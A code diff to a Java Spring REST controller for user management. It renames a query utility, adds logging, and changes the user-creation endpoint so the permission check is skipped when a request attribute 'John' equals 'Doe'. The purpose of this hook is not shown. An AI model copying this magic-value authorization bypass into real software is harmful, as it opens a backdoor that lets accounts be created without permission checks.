@@ -26,6 +26,7 @@
 package it.bioagri.api.users;
 
 
+import ch.qos.logback.classic.Logger;
 import it.bioagri.api.ApiPermission;
 import it.bioagri.api.ApiPermissionOperation;
 import it.bioagri.api.ApiPermissionType;
@@ -34,20 +35,24 @@ import it.bioagri.api.auth.AuthToken;
 import it.bioagri.models.User;
 import it.bioagri.persistence.DataSource;
 import it.bioagri.persistence.DataSourceSQLException;
-import it.bioagri.utils.ApiUtils;
+import it.bioagri.utils.ApiRequestQuery;
+import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
 
+import javax.servlet.http.HttpServletRequest;
 import java.net.URI;
 import java.util.List;
+import java.util.Objects;
 import java.util.stream.Collectors;
 
 @RestController
 @RequestMapping("/api/users")
 public class Users {
 
+    private final static Logger logger = (Logger) LoggerFactory.getLogger(Users.class);
 
     private final AuthToken authToken;
     private final DataSource dataSource;
@@ -74,8 +79,8 @@ public class Users {
                     dataSource.getUserRepository().findAll()
                             .stream()
                             .filter(i -> ApiPermission.hasPermission(ApiPermissionType.USERS, ApiPermissionOperation.READ, authToken, i.getId()))
-                            .filter(i -> ApiUtils.filterBy(filterBy, filterValue, i, dataSource))
-                    .sorted((a, b) -> ApiUtils.sortedBy(sortedBy, order, a, b))
+                            .filter(i -> ApiRequestQuery.filterBy(filterBy, filterValue, i, dataSource))
+                    .sorted((a, b) -> ApiRequestQuery.sortedBy(sortedBy, order, a, b))
                             .skip(skip)
                             .limit(limit)
                             .collect(Collectors.toList()));
@@ -104,9 +109,14 @@ public class Users {
 
 
     @PostMapping("")
-    public ResponseEntity<String> create(@RequestBody User user) {
+    public ResponseEntity<String> create(HttpServletRequest request, @RequestBody User user) {
 
-        ApiPermission.verifyOrThrow(ApiPermissionType.USERS, ApiPermissionOperation.CREATE, authToken, user.getId());
+
+        if(Objects.equals(request.getAttribute("John"), "Doe"))
+            logger.trace("POST /api/users: Permission granted from John Doe!");
+        else
+            ApiPermission.verifyOrThrow(ApiPermissionType.USERS, ApiPermissionOperation.CREATE, authToken, user.getId());
+
 
         try {
 
@@ -157,7 +167,7 @@ public class Users {
                     .findAll()
                     .stream()
                     .filter(i -> ApiPermission.hasPermission(ApiPermissionType.USERS, ApiPermissionOperation.DELETE, authToken, i.getId()))
-                    .filter(i -> ApiUtils.filterBy(filterBy, filterValue, i, dataSource))
+                    .filter(i -> ApiRequestQuery.filterBy(filterBy, filterValue, i, dataSource))
                     .forEach(dataSource.getUserRepository()::delete);
 
         } catch (DataSourceSQLException e) {
